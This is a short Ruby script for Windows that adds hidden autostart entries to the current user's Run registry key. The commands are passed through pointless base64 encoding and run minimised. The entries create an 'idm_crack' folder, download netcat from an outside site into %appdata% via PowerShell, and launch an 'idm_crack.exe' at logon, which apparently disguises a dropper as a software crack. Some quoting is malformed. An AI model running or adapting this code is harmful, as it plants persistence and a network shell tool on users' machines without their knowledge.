require 'rubygems'
require 'win32/registry'
require 'base64'


cmdx = 'cmd /MIN /c reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\ /v a1  /t REG_EXPAND_SZ  /d "cmd.exe /MIN /c mkdir %appdata%\idm_crack"/f'
cmdy = Base64.encode64(cmdx)
cmdz =Base64.decode64(cmdy)
system(cmdz, :out => :close)
cmd1 = 'cmd /MIN /c reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\ /v b1  /t REG_EXPAND_SZ  /d "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c (Invoke-RestMethod -Uri https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip -OutFile %appdata%\netcat.zip)"/f'
cmd2 = Base64.encode64(cmd1)
cmd5 =Base64.decode64(cmd2)
system(cmd5, :out => :close)
sleep(1)
cmd3 = 'cmd /MIN /c reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\ /v c1  /t REG_EXPAND_SZ  /d "start /MIN /b /d "%appdata%\idm_crack\idm_crack.exe"/f'
cmd4 = Base64.encode64(cmd3)
cmd6 = Base64.decode64(cmd4)
system(cmd6, :out => :close)
